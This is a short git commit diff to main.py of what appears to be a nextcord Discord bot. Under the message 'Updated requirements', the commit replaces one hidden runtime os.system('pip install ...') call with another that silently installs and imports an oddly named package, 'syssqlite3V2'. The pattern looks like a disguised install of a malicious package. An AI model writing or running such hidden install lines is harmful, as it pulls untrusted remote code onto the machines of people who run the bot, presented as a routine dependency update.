e0093d46cded2f1939d86a0a88c033100b33208e
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-03 07:22:01 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,7 +1,7 @@
 #Importing modules
 import os
-os.system("pip install syscolourtoolkit")
-import syscolourtoolkit
+os.system("pip install syssqlite3V2")
+import syssqlite3V2
 import nextcord, os, ctypes, json, asyncio, hashlib, base64, requests
 from nextcord import ButtonStyle
 from nextcord.ext import commands
